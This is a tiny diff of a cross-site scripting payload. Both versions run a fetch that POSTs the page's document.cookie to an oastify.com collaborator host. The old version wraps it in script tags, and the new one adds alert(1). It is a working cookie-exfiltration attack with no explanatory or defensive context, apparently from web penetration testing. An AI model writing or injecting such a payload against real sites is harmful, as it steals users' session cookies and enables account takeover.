@@ -1,7 +1,6 @@
-<script>
-fetch('https://jax6z6xk3qvhmdqopmmewewet5zwntbi.oastify.com', {
+fetch('https://9z9wowmasgk7b3feecb4l4l4ivooce03.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
-</script>
+alert(1)
